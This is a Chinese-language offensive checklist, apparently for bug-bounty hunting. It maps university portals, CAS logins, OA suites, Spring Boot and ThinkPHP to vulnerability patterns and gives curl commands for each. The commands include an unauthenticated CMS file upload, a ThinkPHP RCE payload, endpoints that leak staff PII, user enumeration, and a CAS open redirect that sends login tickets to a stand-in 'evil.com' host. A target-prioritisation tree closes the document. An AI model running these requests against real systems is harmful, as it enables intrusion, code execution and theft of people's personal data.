# CMS/框架 → 漏洞模式即时映射表

## 用途
识别到目标技术栈后，立即匹配已知高价值漏洞模式和测试命令。
配合 `src-fast-assess.py` 使用。

## P0 - 立即测试 (高价值)

### 金智教育办事大厅 (ehall)
识别: ehall.xxx.edu.cn, AMPConfigure, openresty
漏洞: JSONP未授权API(9端点泄露教职工PII)
```
curl -sk "https://ehall.XXX.edu.cn/jsonp/serviceCenterData.json?searchKey=&containLabels=true"
curl -sk "https://ehall.XXX.edu.cn/jsonp/appIntroduction.json?appId=APPID"
curl -sk "https://ehall.XXX.edu.cn/jsonp/school.json"
curl -sk "https://ehall.XXX.edu.cn/jsonp/userInfo.json"
```
报告: "办事大厅appIntroduction接口未授权访问致教职工信息泄露" [中危]

### 联创天空CAS (lyuapServer)
识别: /lyuapServer/login, ly-iap-cas-ui, dengzijian@ly-sky.com, React SPA
漏洞: 用户枚举+验证码未生效+密码错误计数
```
# 不存在用户 → NOUSER
curl -sk -X POST "https://cas.XXX.edu.cn/lyuapServer/v1/tickets" -d "username=nonexistent999&password=test"
# 存在用户 → PASSERROR(data=N)
curl -sk -X POST "https://cas.XXX.edu.cn/lyuapServer/v1/tickets" -d "username=admin&password=wrong"
# 验证码 → 返回-1(未生效)
curl -sk "https://cas.XXX.edu.cn/lyuapServer/kaptcha"
```
报告: "CAS统一认证平台存在用户枚举漏洞" [中危]

### LyWebServer CMS
识别: Server: LyWebServer, var lysid=, /api/cms/*, AWS托管
漏洞: 未授权文件上传(CVSS 10.0) + CORS系统性漏洞
```
# 提取siteId
curl -sk "https://XXX/" | grep -oP 'lysid="[^"]*"'
# 上传(无需认证!)
curl -sk -X POST "https://XXX/api/cms/upload?siteId=SITEID" -F "file=@test.html;filename=test.html"
# CORS测试
curl -sk -D- "https://XXX/api/cms/captchaImage" -H "Origin: https://evil.com" | grep -i access-control
```
报告: "XXX学院网站未授权文件上传漏洞" [严重]

### 契约锁电子签章
识别: qiyuesuo.com, 契约锁, Nuxt.js+Element UI
漏洞: CORS任意Origin+Credentials + /health内网IP
```
curl -sk -D- "https://passport.qiyuesuo.com/" -H "Origin: https://evil.com" | grep -i access-control
curl -sk "https://passport.qiyuesuo.com/health"
```
报告: "电子签章平台存在CORS配置不当漏洞" [高危]

## P1 - 值得测试 (中等价值)

### 蓝盾CAS (Bluedon lyuapServer)
识别: /lyuapServer/login, /ly_web_casconsole/, com.bluedon, Server含Microsoft-IIS/6.666(WAF伪装)
漏洞: CAS Open Redirect + 验证码明文泄露 + Struts2堆栈泄露 + 内网IP泄露
```
# CAS Open Redirect (service参数注入)
curl -sk "https://TARGET/lyuapServer/login?service=https://evil.com/steal-ticket" | grep -oP 'action="[^"]*"'
# 验证码明文泄露
curl -s -c /tmp/c.txt "https://TARGET/ly_web_casconsole/system/login!getyzm.action" | grep -oP '"rand":"\K[^"]+'
# Struts2堆栈泄露 (需先获取验证码)
curl -s -b /tmp/c.txt "https://TARGET/ly_web_casconsole/system/login!logincheck.action" --data-binary "myusername=admin&password=%&captcha=CAPTCHA"
# 内网IP泄露
curl -sk "https://TARGET/lyuapServer/login" | grep -oP 'href="[^"]*172\.[^"]*"'
# LT参数主机名泄露
curl -sk "https://TARGET/lyuapServer/login" | grep -oP 'name="lt" value="[^"]*"'
```
报告: "CAS统一认证平台登录后开放重定向漏洞" [中危]
详细: `references/cas-management-console-testing-patterns.md`

### CoCall视频会议 (Thunisoft华宇信息)
识别: 非标端口(如65083), 页面标题CoCall, SSL证书含Thunisoft/cocall@thunisoft.com, /interface/路径
漏洞: CORS任意Origin+Credentials反射
```
curl -sk "https://TARGET:PORT/interface/api/login" -H "Origin: https://evil.com" -D -
# 检查 access-control-allow-origin: https://evil.com + access-control-allow-credentials: true
```
注意: API需租户前缀 `/interface/{tenant}/api/...`，租户名需从JS/域名/错误信息推断

### 金智教育CAS (wisedu/ycServer)
识别: /authserver/login, wisedu, com.wisedu.minos, DEFAULT_SALT, .htl API, _vesi cookie
漏洞: CORS预检反射+堆栈跟踪+CAS Open Redirect
```
curl -sk "https://authserver.XXX.edu.cn/authserver/login" | grep pwdDefaultEncryptSalt
curl -sk -D- "https://authserver.XXX.edu.cn/authserver/login" -H "Origin: https://evil.com" | grep -i access-control
# 嵌套URL重定向
curl -sk "https://authserver.XXX.edu.cn/authserver/login?service=https://ehall.XXX.edu.cn/login?service=https://evil.com" | grep -oP 'action="[^"]*"'
```

### 通达OA
识别: 通达, Tongda, Office Anywhere, nginx+PHP
漏洞: 已知RCE(需登录态), 文件上传, gateway.php
```
curl -sk "https://oa.XXX.edu.cn/" | grep -i "通达\|tongda\|Office"
curl -sk "https://oa.XXX.edu.cn/login.php" -o /dev/null -w "%{http_code}"
```

### 致远OA (Seeyon)
识别: /seeyon/index.jsp, V8_0SP1, _SecuritySeed
漏洞: REST Token泄露(JS硬编码), 管理后台暴露, 反序列化
```
curl -sk "https://oa.XXX.edu.cn/seeyon/index.jsp" | grep -i "title\|version\|V[0-9]"
curl -sk "https://oa.XXX.edu.cn/seeyon/management/index.jsp" -o /dev/null -w "%{http_code}"
```

### 泛微OA (Weaver E-Cology)
识别: weaver, ecology, e-cology, /api/ec/
漏洞: BshServlet RCE, API未授权, SQL注入
```
curl -sk "https://oa.XXX.edu.cn/api/ec/dev/crud/queryBySql"
curl -sk "https://oa.XXX.edu.cn/weaver/bsh/servlet/BshServlet"
```

### Spring Boot
识别: /actuator, whitelabel error, spring
漏洞: Actuator泄露(env/heapdump), Swagger暴露
```
curl -sk "https://XXX/actuator" -o /dev/null -w "%{http_code}"
curl -sk "https://XXX/actuator/env" -o /dev/null -w "%{http_code}"
curl -sk "https://XXX/swagger-ui.html" -o /dev/null -w "%{http_code}"
curl -sk "https://XXX/druid/login.html" -o /dev/null -w "%{http_code}"
```

### ThinkPHP
识别: ThinkPHP, think\app
漏洞: RCE(命令注入), 日志泄露
```
curl -sk "https://XXX/?s=/index/\\think\\app/invokefunction&function=phpinfo&args[0]=1"
```

## P2 - 低优先级

### SUDY WebPlus CMS
识别: sudy-jquery, .psp页面, sudyNavi, sudy-wp-siteId
漏洞: 搜索API(公开内容), admin IP泄露(低危)
→ 跳过admin IP泄露(黑名单), 仅在搜索API返回非公开数据时报告

### 博达CMS (Visual SiteBuilder)
识别: <!--Announced by Visual SiteBuilder 9-->, /_sitegray/
漏洞: 搜索API, getSession.jsp未授权会话
```
curl -sk "https://XXX/_sitegray/_sitegray.js"
curl -sk "https://XXX/_web/_search/api/search/new.rst" -d "keyword=test"
```

### Apereo CAS
识别: /cas/login, apereo, jasig
漏洞: JSESSIONID URL泄露(低危), 盐值泄露(低危)
→ 黑名单模式,跳过

### 深信服VPN (Sangfor/EasyConnect)
识别: sangfor, easyconnect, sangine, aTrust
漏洞: 信息泄露, 已知CVE(需版本确认)
```
curl -sk "https://vpn.XXX.edu.cn/por/login_psw.csp" | grep -i version
```

### Coremail
识别: /coremail/, mailtech
漏洞: 版本泄露, 用户枚举(需正确API格式)
```
curl -sk "https://mail.XXX.edu.cn/coremail/" | head -10
```

## SKIP - 跳过 (非漏洞)

### Dify AI Chatbot
识别: difyChatbotConfig, chatbotConfig, token: + baseUrl:
原因: 前端widget token公开设计, API 401鉴权

### 反向代理空200
识别: 敏感路径200+空body, 随机路径404
原因: 非真实端点暴露

### SPA Fallback
识别: 所有路径返回同一HTML
原因: 不是真实漏洞

## 快速决策树

```
指纹识别结果
  ├── P0命中 → 立即测试对应命令(10个请求内)
  ├── P1命中 → 在P0测试后继续(再10个请求)
  ├── P2命中 → 仅在有余力时测试
  ├── SKIP → 跳过
  └── 无命中 → 快速扫描3-5个高价值子域
       ├── 有发现 → 重新指纹识别
       └── 无发现 → 换目标
```
